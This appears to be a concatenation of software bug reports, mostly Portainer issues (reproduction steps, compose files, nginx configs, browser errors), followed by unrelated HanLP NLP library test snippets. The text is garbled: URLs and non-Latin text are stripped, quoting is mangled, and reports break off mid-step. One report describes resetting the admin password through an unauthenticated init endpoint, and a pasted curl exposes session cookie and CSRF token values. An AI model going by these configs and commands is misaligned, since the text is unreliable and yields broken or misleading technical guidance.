verify with service inspect in command line docker service inspect whoami0 "spec": { ..
"updateconfig": { "parallelism": 1, "failureaction": "pause", "monitor": 5000000000, "maxfailureratio": 0, "order": "start-first" }, ..
go in portainer, search the service, choose it and make a change, for example scale up 4 verify with service inspect in command line and see the bug "updateconfig": { "parallelism": 1, "failureaction": "pause", "monitor": 5000000000, "maxfailureratio": 0, "order": "stop-first" }, any other info e.g
why do you consider this to be a bug? what did you expect to happen instead? order must be set to the previous value and not "order": "stop-first"
create a container with `docker run -p 192.168.1.100:8080:8080 ...`
login to the web ui
view "container list"
hover on "published ports" of a running container, the url is ` `
click the url goes to ` `
should be `192.168.1.100:8080`
create new container
enter container details for newly created container
scroll down to "connected networks"
leave all connected networks by clicking "leave network"
when container has left all networks, the "connected networks" pane disappears
**expected results**
"connected networks" pane should say, giving the ability to add networks to the container
create a new docker container /w docker create 2
go to portainer page.
check the new container
on 1st load to the front page, the start button is greyed out
any other info e.g
why do you consider this to be a bug? what did you expect to happen instead? it should allow me to start without going into the specific container
it used to, not sure exactly when started but was recently
* portainer version: 1.13.6
* target docker version (the host/cluster you manage): 1.12.6
* platform (windows/linux): linux
* command used to start portainer (`docker run -p 9000:9000 portainer/portainer`): docker run -d --name=portainer --restart=always -v "/var/run/docker.sock:/var/run/docker.sock" -p 9000:9000 portainer/portainer
* target swarm version (if applicable):
* browser: all, chrome, firefox, ie
![portainer](
go to the volumes view
you need to have more than 10 volumes for this.
click the "select-all" checkbox.
click the remove button
**any other info e.g
why do you consider this to be a bug? what did you expect to happen instead?** i consider this a bug because it is an annoying ui glitch
if i want to select all volumes on the next page then i have to click it twice, first to get it out of the "selected" state then to select again
i would expect it to auto-unselect after deletion
create container without exposed ports
open portainer:9000/#/containers any other info e.g
why do you consider this to be a bug? what did you expect to happen instead? i'm pretty sure that it should list containers even if one of them does not expose any ports
don't know how to reproduce with another host
just can say, the connection works great an in-time after a browser reload
all endpoints (also those without this behaviour) have the same docker version and were installed and configured the same way.
create a team t1 and two users in that team: u1 and u2
allow access to the local endpoint to t1
login as u1 and create a container with restricted access to the team t1
login as u2 and remove the previously created container any other info e.g
why do you consider this to be a bug? what did you expect to happen instead? the information message should be a success message instead of an error message.
create a dead container (i do not know how to produce this) any other info e.g
why do you consider this to be a bug? what did you expect to happen instead?
create two teams t1 and t2
create two users u1 and u2
go to access management and give access to t1 and t2
u1 disappears from the available users and teams table any other info e.g
why do you consider this to be a bug? what did you expect to happen instead? u1 should still be in the available users and teams table.
create two portainer instances, e.g
using docker-compose like so:
version: '3.1'
services: dev: deploy: replicas: 1 command: "--external-endpoints /endpoints.json" image: portainer/portainer:1.13.4 ports: - "9000:9000" environment: http_proxy: " " no_proxy: ".mycompany.com" logspout: ignore volumes: - /var/local/portainer/data-dev:/data - /var/local/portainer/endpoints-dev.json:/endpoints.json - /var/local/portainer/certs:/certs - /var/run/docker.sock:/var/run/docker.sock networks: - proxynet qa: deploy: replicas: 1 command: "--external-endpoints /endpoints.json" image: portainer/portainer:1.13.4 ports: - "9001:9000" environment: http_proxy: " " no_proxy: ".mycompany.com" logspout: ignore volumes: - /var/local/portainer/data-qs:/data - /var/local/portainer/endpoints-qa.json:/endpoints.json - /var/local/portainer/certs:/certs - /var/run/docker.sock:/var/run/docker.sock networks: - proxynet
networks: proxynet: external: true
create a reverse proxy for both, like the following nginx example
upstream portainer_dev { server portainer_dev:9000;
upstream portainer_qa { server portainer_qa:9000;
server { listen 80; location / { root /srv/www; index index.html index.htm; } location /portainer-dev/ { proxy_http_version 1.1; proxy_set_header connection ""; proxy_pass } location /portainer-dev/api/websocket/ { proxy_set_header upgrade $http_upgrade; proxy_set_header connection "upgrade"; proxy_http_version 1.1; proxy_pass } location /portainer-qa/ { proxy_http_version 1.1; proxy_set_header connection ""; proxy_pass } location /portainer-qa/api/websocket/ { proxy_set_header upgrade $http_upgrade; proxy_set_header connection "upgrade"; proxy_http_version 1.1; proxy_pass }
login to the first instance, then, in another tab, navigate to the second instance i'd expect that to work just fine, but right now im getting the aforementioned error.
create endpoint for swarm 1.2.7
select endpoint
press containers
error message appears any other info e.g
why do you consider this to be a bug? what did you expect to happen instead?
start a container using `docker run alpine sh -c \'echo; echo "vm options {"; sleep 60\'`
look at the log for this container (with timestamps switched off)
you'll see something like this: ``` ns { ```
switch timestamp display on - the log looks ok now: ``` 2017-06-29t12:51:04.043911730z 2017-06-29t12:51:04.043911755z vm options { ```
login to ui
click "services"
click "add service"
click "volumes"
click "map additional volume"
click "select a volume"
create a secret
use the secret in a container on the command line with a different target name
update the service in portainer, for instance the replicas
refresh and the secret file name is changed any other info e.g
why do you consider this to be a bug? what did you expect to happen instead?
create a secret
use the secret in a container
remove the secret
refresh and the secret is still there any other info e.g
why do you consider this to be a bug? what did you expect to happen instead?
prequisites: - have portainer running alongside a docker host that does not have access to the main docker registry
- have custom templates defined referencing an image that is available locally on the docker host or available on a local registry 1
go to the 'app templates' menu and click on your template
click 'create' to start a new container
recieve error 'failure - get dial tcp: lookup registry-1.docker.io: no such host' and no new container is created **expected behaviour** 1
go to the 'app templates' menu and click on your template
click 'create' to start a new container
portainer is unable to pull from docker registry so then looks to see if image is available on custom registry (if specified in json def) or available locally on docker host
if available then image is pulled from here and container is created
**example json** { "title": "registry", "description": "docker image registry", "categories": ["docker"], "platform": "linux", "logo": " ", "image": "registry:latest", "ports": [ "5000/tcp" ], "volumes": ["/var/lib/registry"] } and (this def worked as of 1.13.2) { "title": "registry", "description": "docker image registry", "categories": ["docker"], "platform": "linux", "logo": " ", "image": "registry:latest", "registry": "my_ip_of_local_registry:5000", "ports": [ "5000/tcp" ], "volumes": ["/var/lib/registry"] }
open portainer in google chrome (make sure left panel is [expanded](
go to "containers"
open a running container by clicking its name
click **console** > **connect**
5.add some content to console so that scroll bar appears
6.move mouse over thse scroll bar and try to drag it up or down **actual behavior** : scroll bar doesn't respond, content in the console isn't scrolled
start nginx + letencrypt helper
start portainer
start database + phpmydmin
start website 1
start website 2
6 stop / start website 1 or 2
create a new user with password for instance 1234&1234 2
try to login with this user portainer is running behind [nginx-proxy](
docker stack deploy -c docker-compose.yml inital-setup @deviantony told me to make this ticket
create a service in portainer 1.13.0 with a bind mount
check service settings, shows volume mount instead
check logs of task, also shows 'invalid volume mount source, must not be an absolute path:' any other info e.g
why do you consider this to be a bug? what did you expect to happen instead?
grab a beer
create a `dockerfile` with `healthcheck`
check `cmd` value on the image details page :)
docker pull jenkins:latest
goto portainer images page
goto jenkins:latest image detail page
try to pull jenkins:latest by pressing the button with the download/pull symbol any other info e.g
why do you consider this to be a bug? what did you expect to happen instead?
type in "bla.blubb" as example user name
http request fails with 400: json: err: invalid request data format
create a new service
go to the service details view
no matter the parameters of the service, fields are always empty and display their placeholders
any other info e.g
why do you consider this to be a bug? what did you expect to happen instead? information for each field should be displayed.
open any page in portainer except the root one.
copy the url of the page
paste it into a new tab that did not have portainer already open
it looks like going directly to some route skips initializing variables that are required to access the portainer api resulting in ajax links like: instead of (note the 1)
open a prompt
type long command
take a beer any other info e.g
why do you consider this to be a bug? what did you expect to happen instead?
version a using wizard:
start the container and mount the data-volume and local socket: `docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v d:\\docker\\portainer-config:/data --name portainer portainer/portainer`
use the wizard to add a new remote endpoint using tls
upload fails with "unable to upload tls certs" (http error: mkdir /data/tls/<endpoint-id>: file exists (code=500)) version b using endpoint-settings:
start the container and mount the data-volume and local socket: `docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v d:\\docker\\portainer-config:/data --name portainer portainer/portainer`
select the local docker in the wizard
go to the endpoints-option in the portainer settings
add a new endpoint and try to add tls
upload fails with "unable to upload tls certs" but will create new folders in /data/tls each time the add-button is clicked (http error: mkdir /data/tls/<endpoint-id>: file exists (code=500)), containing only ca.pem or ca.pem + cert.pem (no key.pem)
hitting the button a fourth time will somehow succeed and create a working endpoint (the folder does contain all files)
**but** the endpoint overview will now show 4 endpoints, as the previous endpoints were still created (5 with the local endpoint) version c using endpoint-settings:
start the container and mount the data-volume and local socket: `docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v d:\\docker\\portainer-config:/data --name portainer portainer/portainer`
select the local docker in the wizard
go to the endpoints-option in the portainer settings
add a new endpoint **without** tls
edit the new endpoint and add the tls option and all files
saving the changes will be successful, but no files will be added to the filesystem any other info e.g
why do you consider this to be a bug? what did you expect to happen instead?
click networks
advanced settings
create network, and ensure that the slider is enabled
watch, as a network with access to gwbridge is created i have tested this with both the slider enabled and disabled, and the same results ensue
i can create an isolated network manually using docker network create, but networks created via portainer always seem to have access to gwbridge.
start portainer as swarm service: `docker service create \\ --name portainer \\ --publish 9000:9000 \\ --constraint 'node.role == manager' \\ --mount type=bind,src=/var/run/docker.sock,dst=/var/run/docker.sock \\ portainer/portainer \\ -h unix:///var/run/docker.sock`
add endpoint using its address **docker-swarm-node:2376** and activate tls
if you try to change endpoint you will see this in the logs:
`2017/03/20 16:30:40 http: proxy error: dial tcp <docker-swarm-node>:443: getsockopt: connection refused` what is strange is that port 443 is used (instead of expected 2376)
create a user without access to an endpoint
try to login (get an error "user not allowed
please contact your administrator.")
access root url of the service
user is logged in
get trial subscription for ms azure
in azure panel set up new azure container service, i've used following settings: - orchestrator is ofc swarm - west europe region - 1 master node - 2 agents on a0 machines
let the deployment finish and go to resource group containing it
go to swarm-master-lb-* (load balancer for master node) 1
create health probe for port 9000 (rest default) 2
create load balancing rule for port 9000 and use created health probe (rest default)
go to swarm-master-\\*-nic-* (network interface for master node) 1
write down ip from overview/private ip address
go back to resource group/deployments and pick the one at the top (successful one) 1
write down masterfqdn 2
write down sshmaster0 3
write down agentfqdn
you have given id-rsa.pub key from your machine
connect to your acs from that machine using sshmaster0 (it's whole ssh command so just copy&paste&run)
you are connected to the master node 1
add portainer as a service running cmd1 (below)
in browser go to and set up admin password and log in
you should be connected to swarm-master-* node 1
go to endpoints and add a new one with url: *ip_from_point_5_1*:2375
now switch the active endpoint to newly created and voila! - you are in swarm right now
go to containers 2
add container
i used following data: * name: asd123 * image: nginx 3
click create - "network nat not found" error appears
you can go to network and choose any network - same error will appear
when you go back to containers, you will see that all containers were created (only in name, as they do not run on the machine)
**cmd1** ```
docker service create \\ --name portainer \\ --publish 9000:9000 \\ --constraint 'node.role == manager' \\ --mount type=bind,src=/var/run/docker.sock,dst=/var/run/docker.sock \\ portainer/portainer \\ -h unix:///var/run/docker.sock
``` in step 7
you can go through docker configuration from cli
after running `docker ps`, a swarm & consul containers can be observed
to explore swarms insides run `export docker_host=:2375` and yet again go through docker configuration from cli (`docker info` etc).
please note, that only ports 80, 8080 and 443 are open in default, the rest has to be opened just like in step 4., but if you want ports for swarm agents, you have to do this in swarm-agent-lb-* instead
any other info e.g
why do you consider this to be a bug? what did you expect to happen instead? i expected the container does not appear on the screen
go to the apps templates
select a template where the image is not available on the endpoint
create the template
have portainer reverse proxied via nginx using config provided by documentation
open portainer
navigate to containers
it auto refreshes **any other info e.g
why do you consider this to be a bug? what did you expect to happen instead?** it doesn't do this when its reverse proxied
it should show the list of containers.
connect to a swarm mode enabled cluster
go to the swarm view
click on any node name any other info e.g
why do you consider this to be a bug? what did you expect to happen instead? the node details view should be displayed.
create new container.
test to create with the command: /bin/bash -c "service ssh start & service mysql start & service cron start & /usr/sbin/apache2ctl -dforeground"
an error message appears
it seams to replace the " with a \\" and an error is returned
any other info e.g
why do you consider this to be a bug? what did you expect to happen instead?
open web ui
connect to a container's shell
do anything else, like surfing on an another tab on the web browser to search something
come back on the tab with the shell
try to type anything in the prompt any other info e.g
why do you consider this to be a bug? what did you expect to happen instead?
go to swarm view
click on headers to sort columns by value
go to the container list view
here is the docker-compose file ```
version: '2'
services: portainer: image: "portainer/portainer" restart: "always" volumes: - "./portainer/app:/data" - "/var/run/docker.sock:/var/run/docker.sock" ports: - "9000:9000"
``` i have a folder /portainer/app that is supposed persist the app data 2
execute docker run, or compose
app skips setup and displays login page, attempt to login
get "invalid credentials" error any other info e.g
why do you consider this to be a bug? what did you expect to happen instead? after building and starting the container it should go through the wizard for a new user
it goes straight to the login
if i remove the mounted /data volume it works as expected
once the container starts there is an empty /tls directory that is placed on the host machine.
open stats for a container
wait for the /stats request to be sent
navigate to another view before the /stats request resolves
confirm that repeated /stats requests are still being issued
have an image with multiple tags (very long tag names in my case)
try to delete the image from ` #/images/` (checkbox + remove button) - fail
try to delete the image from ` #/images/sha256:<sha>/` (delete this image) - fail if i delete the tags one-by-one from "image tags" it works.
open a bash console
type "ls -l" at "ls ", i see "ls ls "
run portainer 2
post to /api/users/admin/init with json [password: mypassword]
login with this password
post to /api/users/admin/init with json [password: myotherpassword] without authorization header
login with mypassword is impossible
login with myotherpassword is possible i think after first init second should require authorization header at least
groovy script to reproduce in bug.txt file.
run a container with a dash (minus sign) in its name, e.g
go to "networks" view
klick on the name of a shown network
in the network details view, look at the "containers in network" area
there are no containers shown, even not the connected ones
open the chrome developer tools and the console there
see the error message and stack trace:
typeerror: cannot set property 'id' of undefined at at array.foreach (native) at at at at n.$eval ( at n.$digest ( at n.$apply ( at i ( at u ( at xmlhttprequest.y.onload (
``` if i inspect the network tab in chrome developer, i can see the json answer from portainer which contains the array with all container connected to that network
so i suspect that there is a bug in the javascript code analyzing the json answer
i suspect that at some point in the javascript code, the container name is used without "escaping" it via ticks
if i stop the container with the dash in its name, the view with the containers of a network show up as expected.
run a new portainer with `-v /var/run/docker.sock:/var/run/docker.sock`
create a local endpoint
rename it 4
it not working anymore
have a local docker engine
have a `swarm` or `swarm-mode` cluster any number of workers
when your in your `local` machine the events tab is available, when you switch to the swarm/swarm-mode docker engine the tab is gone
you will gain the swarm tabs of course
any other info e.g
why do you consider this to be a bug? what did you expect to happen instead? yes to me it's a bug, when i target events on the `local` machine then switch the te view of the swarm cluster then i see the events of that cluster
that means that the functionality is there.
`docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer`
go to a random container stats view
add a container with `--net=host` and no other port exposes (plex or openhab in this case)
open stats for the container **fixing idea:** i think a quick fix would be to try catch the updating of the graphs, because the only issue is that the scripts wants data but gets a variable with undefined.
another fix would be to set a default value to apply when the api returns undefined.
i dont know if you can get the rx and tx data of containers with `--net=host`?
make program inside container crash.
check to make sure a stale pid-file is present.
try to restart container
confirm that portainer says it is running, and check if the program inside the container is not running
any other info e.g
why do you consider this to be a bug? what did you expect to happen instead?
navigate from menu containers -> click add container
input an image name with uppercase letter, for example "myapp:rc1", and disable "always pull image before creating" -> click create
error message prompt: "no such image: myapp:rc1"
expected result: portainer should create a container from "myapp:rc1" image.
serve portainer behind a subfolder with a reverse proxy /portainer/
try any endpoint api they 404 because the want to connect to /api instead of /portainer/api
install portainer 1.11.0 and launch
run opera 42.0.2393.94 - opera is up to date
connect to localhost:9000
blank screen; some html is returned, but the page does not render
any other info e.g
why do you consider this to be a bug? what did you expect to happen instead? i expected to see the full new portainer console, and i can see it via chrome when i log in there.
start portainer (e.g
`grunt run`).
create admin account, fill in any password.
log in with previously entered password.
log in happens successfully, but the token is instantly expired and you will be logged out.
1.goto services
2.open a services detail page
3.click scale, change scale and apply
4.refresh page / service details.
create a container
go to container details view
click on the name of the associated network in the connected networks table
`docker network create --driver overlay --subnet 172.20.0.0/24 mc`
docker service create \\ --network=mc \\ --name=consul \\ -e consul_bind_interface=eth2 \\ --mode global \\ -p 8500:8500 \\ consul agent -server -ui -client=0.0.0.0 \\ -bootstrap-expect 1 \\ -retry-join 172.20.0.3
remove above consul service
enter portainer interface create service, fill below fields
name: consul
image: consul
scheduling mode: global
command: agent -server -ui -client=0.0.0.0 -bootstrap-expect 1 -retry-join 172.20.0.3
env var: consul_bind_interface eth2 network: mc 3
click create button
service on all node are fail
wait a few minutes, delete service
run command to find why it fail: `docker start -ai containerid`
report `error response from daemon: network consul not found`
<img width="501" alt="snap1" src=" ">
<img width="203" alt="snap2" src=" ">
<img width="546" alt="snap3" src=" ">
<img width="495" alt="snap4" src=" ">
launch a service that has any label:
docker service create --name deleteme --label deleteme.service.label=true --container-label deleteme.container.label=true alpine ping www.google.com
check the service dashboard, we cannot see the service labels there:
![image]( but you can check they are already in the service:
docker service inspect deleteme --pretty
id: 9u8ovzkglof2ho39ijghliryv
name: deleteme
labels: - deleteme.service.label=true
mode: replicated replicas: 1
updateconfig: parallelism: 1 on failure: pause
containerspec: image: alpine args: ping www.google.com
if i update anything in the service in the "service details" panel the service label is removed.
docker service inspect deleteme --pretty
id: 9u8ovzkglof2ho39ijghliryv
name: deleteme
mode: replicated replicas: 1
update status: state: updating started: 16 seconds ago message: update in progress
containerspec: image: alpine:edge args: ping www.google.com
**expected behaviour:** - the service labels should be visible in the "service details" panel.
- the service labels shouldn\'t be removed on any service change in the "service details" panel.
navigate to 'app templates'
click the second page from the pagination menu
select the first option ('rabbitmq' at the time of posting) at the top of the page, the form widget now displays options for the first template on the first page which at the time of posting was 'docker registry' instead of the selected template of 'rabbitmq'
navigate to services
click on a service
in associated tasks part, click on last updated a few times
it's not a consistent bug
in some services, it works properly, in some services, it doesn't.
go to services
create a new service and specify it's scheduling mode as `global`
select the service in the services view to access the service details
try to update the service by adding a new label and then hit the save changes button any other info e.g
why do you consider this to be a bug? what did you expect to happen instead? the service should be edited and the view refreshed
the following javascript error is raised in the console: ```
error: service.replicas is undefined
updateservice@
anonymous/fn@ line 233 > function:2:329
b@
lc[b]</<.compile/</</e@
vf/this.$get</m.prototype.$eval@
vf/this.$get</m.prototype.$apply@
lc[b]</<.compile/</<@
sf@
rf/d@
go the containers view
select a container
use the action leave network any other info e.g
why do you consider this to be a bug? what did you expect to happen instead? the current behavior is to redirect to the network view after leaving the network
it should redirect to the current container details view.
run docker container to connect to swarm manager at swarm mode 2
go to browser:
sellect container and connect to console, install vim package, run command vi name_file.txt
console will be freeze and log on console of google chrome:
``` portainer.js:6 websocket connection to 'ws://10.1.3.4:9000/ws/exec?id=d2d8147c3b995c68d638802fddea63392b56979a69f1cf3ff5bad37f22db4b4d' failed: could not decode a text frame as utf-8
run docker container to connect to swarm manager at swarm mode 2
go to browser:
list container and have bug on console log of google chrome:
angular.js:2 typeerror: cannot read property 'ipaddress' of undefined at new containerviewmodel ( at at array.map (native) at at at at n.$eval ( at n.$digest ( at n.$apply ( at i ( function) @ angular.js:2
click on the `console` link on a running container
click on the `connect` button when inspecting the failed request in the devtools i see the request to
``` fails with a `403 (forbidden)` error
the response of the failed request is ```
forbidden - csrf token invalid
``` curl of the failed request ```
curl \' -h \'pragma: no-cache\' -h \'origin: -h \'accept-encoding: gzip, deflate, br\' -h \'x-csrf-token: 5m3igxdsfeiprborywelzezik+rfaowl+p8ay+cuv+11vjdjfag4srujukb/lkrhne26rwwgfxxv9oueqs+4zq==\' -h \'accept-language: de,en-us;q=0.8,en;q=0.6\' -h \'user-agent: mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) ubuntu chromium/54.0.2840.59 chrome/54.0.2840.59 safari/537.36\' -h \'content-type: application/json;charset=utf-8\' -h \'accept: application/json, text/plain, */*\' -h \'cache-control: no-cache\' -h \'referer: -h \'cookie: _gorilla_csrf=mtq3odaxnjeynnxjbmryv2tkewffdfdoaxr0yxk5d04xsjzxrkp6ymxgclp6vlljr3hyzwpst1dtndbkv0phtuzgefdwazljz289fp8bum132gwf_66lmv7x8ebi42ipz5lpl2njstpwds1h; _gorilla_csrf=mtq3odaxnjeynhxjbxq2ykzsvffystjurkjetm5cqln6tk9rekpdyvhscgrrdghlm3bdvuvaulrgrjjjatlwtkrkq05hyzljz289fdezoiaz1hsexhekwdhufq59q8am4pbwgtxwoneg4a0p; toggle=true; csrftoken=5m3igxdsfeiprborywelzezik+rfaowl+p8ay+cuv+11vjdjfag4srujukb/lkrhne26rwwgfxxv9oueqs+4zq==\' -h \'connection: keep-alive\' -h \'dnt: 1\' --data-binary \'{"id":"39791e9faca17709c20081696b2aa02216ac0f5d4807e32c38870b4d4ab2fc46","attachstdin":true,"attachstdout":true,"attachstderr":true,"tty":true,"cmd":["bash"]}\' --compressed
go to containers
go to add a container
use the image microsoft/nanoserver
select create the container should be created without issue
the error is related to the bridge network not found, this network is only found on docker for linux, default network on windows is 'nat'.
go to containers view
select a container to display the container details view the ip address of the container should be displayed in the container status panel.
go to the container list
stop a container then the loader keeps spinning and the issue is raised in the browser console.
go to the containers view
select a container
go to console view
click on connect nothing happens
console reports the following error: ```
uncaught referenceerror: terminal is not defined
provide a reproducible test case that is the bare minimum necessary to generate the problem
tokenizer = hanlp.load(hanlp.pretrained.cws.large_albert_base)
provide a reproducible test case that is the bare minimum necessary to generate the problem.
anlp-doc-zh/hanlp-doc-zh/tests/train/zh/train_msra_ner_albert.py
```python string text = "hanlp " + " " + " ww.hankcs.com " + " " + " . , ankcs. , "; list<term> termlist = urltokenizer.segment(text); system.out.println(termlist); for (term term : termlist) { if (term.nature == nature.xu) system.out.println(term.word); }
[hanlp/nx, /uj, /n, /n, /v, /w, /v, /n, /v, /w, /r, /d, /v, /p, www/nx, ./w, hankcs/nrf, ./w, com/nx, /f, /v, /m, /n, /w, /r, /uj, /n, /v, //w, /w, /v, /vd, /nz, hankcs/nrf, ./w, com/nx, /uj, /n, /w, /v, ./w, /ns, /n, /v, /v, /ul, ,/w, /c, /r, /c, /v, /v, hankcs/nrf, ./w, /ns, ,/w, /c, /a, /w]
>>> syntactic_parser = hanlp.load(hanlp.pretrained.dep.ctb7_biaffine_dep_zh)
>>> print(syntactic_parser([( , 'nr'), (' ', 'nn'), (' ', 'ad'), (' ', 'pu')])) # anlp emo pipeline
1 _ nr _ _ 2 nn _ _
2 _ nn _ _ 4 assmod _ _
3 _ ad _ _ 2 assm _ _
4 _ pu _ _ 7 nsubj _ _
provide a reproducible test case that is the bare minimum necessary to generate the problem
os.environ[\'cuda_visible_devices\'] = "-1"
import hanlp
import pickle
import traceback
tokenizer = hanlp.load(hanlp.pretrained.cws.pku_name_merged_six_months_convseg)
tagger = hanlp.load(hanlp.pretrained.pos.ctb5_pos_rnn_fasttext_zh)
semantic_parser = hanlp.load(hanlp.pretrained.sdp.semeval16_news_biaffine_zh)
text = """hanlp
hanlp """ pipeline = hanlp.pipeline() \\ .append(hanlp.utils.rules.split_sentence, output_key=\'sentences\') \\ .append(tokenizer, output_key=\'tokens\') \\ .append(tagger, output_key=\'part_of_speech_tags\') \\ .append(semantic_parser, input_key=(\'tokens\', \'part_of_speech_tags\'), output_key=\'semantic_dependencies\')
res = pipeline(text) x = res[\'semantic_dependencies\'][0] print("direct dumping result....")
try: with open('tests/test_hanlp.pk', 'wb') as f: pickle.dump(res, f)
except exception as e: traceback.print_exc() print("dumping dict(result) with semantic....")
try: with open(\'tests/test_hanlp.pk\', \'wb\') as f: pickle.dump(dict(res), f) print("dump succeeded")
except exception as e: traceback.print_exc() print("dumping semantic result....")
try: with open('tests/test_hanlp.pk', 'wb') as f: pickle.dump(x[0], f)
except exception as e: traceback.print_exc() print("direct dumping result without semantic....")
del res['semantic_dependencies']
try: with open('tests/test_hanlp.pk', 'wb') as f: pickle.dump(res, f)
except exception as e: traceback.print_exc() print("dumping dict(result) without semantic....")
try: with open(\'tests/test_hanlp.pk\', \'wb\') as f: pickle.dump(dict(res), f) print("dump succeeded")
except exception as e: traceback.print_exc()
provide a reproducible test case that is the bare minimum necessary to generate the problem
```# -*- coding:utf-8 -*-
# author: hankcs
# date: 2019-12-21 15:39
from hanlp.components.tok import transformertokenizer
from hanlp.datasets.cws.sighan2005.msr import sighan2005_msr_train, sighan2005_msr_valid, sighan2005_msr_test
from tests import cdroot
from bert.loader import bert_models_google
bert_models_google['bert-base-chinese']='/usr/cws/bert-base-chinese'
tokenizer = transformertokenizer()
save_dir = 'data/model/cws_bert_base_msra'
tokenizer.fit(sighan2005_msr_train, sighan2005_msr_valid, save_dir, transformer='bert-base-chinese', metrics='f1')
# tagger.load(save_dir)
print(tokenizer.predict([' ', ' ']))
tokenizer.evaluate(sighan2005_msr_test, save_dir=save_dir)
print(f'model saved in {save_dir}') ```
import hanlp
hanlp.load(hanlp.pretrained.dep.ctb7_biaffine_dep_zh)
provide a reproducible test case that is the bare minimum necessary to generate the problem
import pandas as pd
from tqdm import tqdm
os.environ["cuda_visible_devices"] = "-1"
import hanlp
import tensorflow as tf
# set cpu as available physical device
# tf.config.set_visible_devices([], 'gpu')
tf.config.list_physical_devices()
tokenizer = hanlp.load('pku_name_merged_six_months_convseg')
tagger = hanlp.load(hanlp.pretrained.pos.ctb5_pos_rnn_fasttext_zh)
def hanlp_get_tokens(tokens, tags, target_tag_list=[]): res = [] for tokens, post in zip(tokens, tags): for i, j in zip(tokens, post): if i.strip(): if not target_tag_list: res.append(i + '/' + j) else: if j in target_tag_list: res.append(i + '/' + j) return res pipeline = hanlp.pipeline() \\ .append(hanlp.utils.rules.split_sentence, output_key='sentences') \\ .append(tokenizer, output_key='tokens') \\ .append(tagger, output_key='tags') \\ .append(hanlp_get_tokens, input_key=('tokens', 'tags'), output_key='target_token') import tracemalloc
import linecache def display_top(snapshot, key_type=\'lineno\', limit=3): snapshot = snapshot.filter_traces(( tracemalloc.filter(false, "<frozen importlib._bootstrap>"), tracemalloc.filter(false, "<unknown>"), )) top_stats = snapshot.statistics(key_type) print("top %s lines" % limit) for index, stat in enumerate(top_stats[:limit], 1): frame = stat.traceback[0] # replace "/path/to/module/file.py" with "module/file.py" filename = os.sep.join(frame.filename.split(os.sep)[-2:]) print("#%s: %s:%s: %.1f kib" % (index, filename, frame.lineno, stat.size / 1024)) line = linecache.getline(frame.filename, frame.lineno).strip() if line: print(\' %s\' % line) other = top_stats[limit:] if other: size = sum(stat.size for stat in other) print("%s other: %.1f kib" % (len(other), size / 1024)) total = sum(stat.size for stat in top_stats) print("total allocated size: %.1f kib" % (total / 1024)) #
text = " ;"*100
# data_df = data_df.loc[data_df['doc_id'] >= 5150]
tracemalloc.start()
for index, i in enumerate(tqdm([text]*20000)): tokenized = {} # title_counters = counter(title_token) res = pipeline(i)['target_token'] # content_counters = counter(content_token) snapshot = tracemalloc.take_snapshot() display_top(snapshot)
erializable : ```python
class serializable(object): """ a super class for save/load operations
""" def save(self, path, fmt=none): if not fmt: if filename_is_json(path): self.save_json(path) else: self.save_pickle(path) elif fmt in [\'json\', \'jsonl\']: self.save_json(path) else: self.save_pickle(path) def load(self, path, fmt=none): if not fmt: if filename_is_json(path): self.load_json(path) else: self.load_json(path) ###### , oad_pickle elif fmt in [\'json\', \'jsonl\']: self.load_json(path) else: self.load(path)
``` * [x] i've completed this form and searched the web for solutions.
provide a reproducible test case that is the bare minimum necessary to generate the problem
```python system.out.println(chartable.convert(" "));
provide a reproducible test case that is the bare minimum necessary to generate the problem
```java public map<string, double> test() throws ioexception { iclassifier iclassifier = new naivebayesclassifier(trainorloadmodel()).enableprobability(false);; return iclassifier.predict("test java demo"); }
provide a reproducible test case that is the bare minimum necessary to generate the problem
import hanlp
import json print(' ') tokenizer = hanlp.load('ctb6_convseg')
tagger = hanlp.load('ctb5_pos_rnn')
syntactic_parser = hanlp.load('ctb7_biaffine_dep_zh')
semantic_parser = hanlp.load('semeval16_text_biaffine_zh') # ouput_key
pipeline = hanlp.pipeline() \\ .append(hanlp.utils.rules.split_sentence, output_key='s') \\ .append(tokenizer, output_key='t') \\ .append(tagger, output_key='p') \\ .append(syntactic_parser, input_key=('t', 'p'), output_key='syn', conll=false) \\ .append(semantic_parser, input_key=('t', 'p'), output_key='sem', conll=false)
print(pipeline) text = '''hanlp
hanlp
''' doc = pipeline(text)
print(doc) # with open(\'output.json\',"w") as f: json.dump(doc, f, indent=4, ensure_ascii=false) #
provide a reproducible test case that is the bare minimum necessary to generate the problem
import hanlp
import json tokenizer = hanlp.load('ctb6_convseg')
tagger = hanlp.load('ctb5_pos_rnn')
syntactic_parser = hanlp.load(\'ctb7_biaffine_dep_zh\') text = \' \' pipeline = hanlp.pipeline() \\ .append(hanlp.utils.rules.split_sentence, output_key=\'sentences\') \\ .append(tokenizer, output_key=\'tokens\') \\ .append(tagger, output_key=\'part_of_speech_tags\') .append(syntactic_parser, input_key=(\'tokens\', \'part_of_speech_tags\'), output_key=\'syntactic_dependencies\') output = pipeline(text) print(output) with open(\'output.json\',"w") as f: json.dump(output, f, indent=4, ensure_ascii=false)
provide a reproducible test case that is the bare minimum necessary to generate the problem
import hanlp
import json tokenizer = hanlp.load('ctb6_convseg')
tagger = hanlp.load('ctb5_pos_rnn')
syntactic_parser = hanlp.load(\'ctb7_biaffine_dep_zh\') text = \' \' pipeline = hanlp.pipeline() \\ .append(hanlp.utils.rules.split_sentence, output_key=\'sentences\') \\ .append(tokenizer, output_key=\'tokens\') \\ .append(tagger, output_key=\'part_of_speech_tags\') .append(syntactic_parser, input_key=(\'tokens\', \'part_of_speech_tags\'), output_key=\'syntactic_dependencies\') output = pipeline(text) print(output) # ** ** with open(\'output.json\',"w") as f: json.dump(output, f, indent=4, ensure_ascii=false)
provide a reproducible test case that is the bare minimum necessary to generate the problem
tokenizer = hanlp.load('ctb5_pos_rnn')
print(tokenizer(' '))
following were my cell values in colab
!pip install --hanlp
import hanlp
recognizer = hanlp.load(hanlp.pretrained.ner.conll03_ner_bert_base_uncased_en) ```python
provide a reproducible test case that is the bare minimum necessary to generate the problem
